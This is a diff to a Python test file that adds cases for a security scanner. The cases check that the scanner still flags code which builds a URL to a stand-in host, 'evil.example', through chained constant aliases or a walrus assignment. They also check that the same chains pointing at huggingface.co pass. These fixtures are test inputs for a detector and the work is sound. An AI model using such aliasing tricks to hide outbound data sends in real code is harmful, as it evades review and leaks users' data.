@@ -4026,6 +4026,30 @@ def test_a_url_assembled_out_of_named_constants_is_read_as_the_url_it_is():
             + 'url = scheme + separator + host\n' + send
         )
     ]
+    # One constant can be assigned through another, and the substitution runs
+    # to a fixed point: scheme = "https"; alias = scheme leaves alias
+    # unreadable until scheme has been read, one pass earlier.
+    for body in (
+        'scheme = "https"\nalias = scheme\n'
+        'url = alias + "://evil.example/c"\n' + send,
+        'a = "https"\nb = a\nc = b\nurl = c + "://evil.example/c"\n' + send,
+        # A named expression binds a value like any other assignment, and
+        # dropping it left the name unreadable and the URL with it.
+        'if (scheme := "https"):\n'
+        '    url = scheme + "://evil.example/c"\n    ' + send,
+    ):
+        assert [
+            f.check for f in scan_converter_source(
+                'import os\nimport requests\n' + hub + body
+            )
+        ], body
+    # And the same chain over the hub is still the hub.
+    assert scan_converter_source(
+        'import os\nimport requests\n'
+        + 'base = "https://huggingface.co"\nalias = base\n'
+        + 'url = alias + "/api"\n' + send
+    ) == []
+
     # The same assembly that names the hub is the hub, so this reads a
     # destination rather than refusing every file that builds one.
     assert scan_converter_source(
